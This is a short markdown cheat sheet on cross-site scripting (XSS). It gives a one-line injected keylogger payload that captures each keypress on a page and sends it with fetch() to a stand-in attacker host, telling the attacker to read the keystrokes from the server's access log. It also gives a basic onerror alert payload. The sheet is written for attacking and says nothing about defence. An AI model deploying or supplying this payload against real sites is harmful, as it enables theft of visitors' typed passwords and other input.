XSS (Cross-site Scripting)
======
XSS is a type of attack in which malicious scripts are injected and executed into the victim trusted website.

Simple XSS Keylogger
======
This simple keylogger send an request to the attacker website with the key that was pressed on the page
```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://attacker.com?k="+String.fromCharCode(e.which))}, this.remove();'>
```
To check all the records, simply check your access.log on the server

XSS on EventListeners
======
#### onerror
Trigger the event by sending a malformed src attribute
```html
<img src=x onerror="alert('XSS')">
```

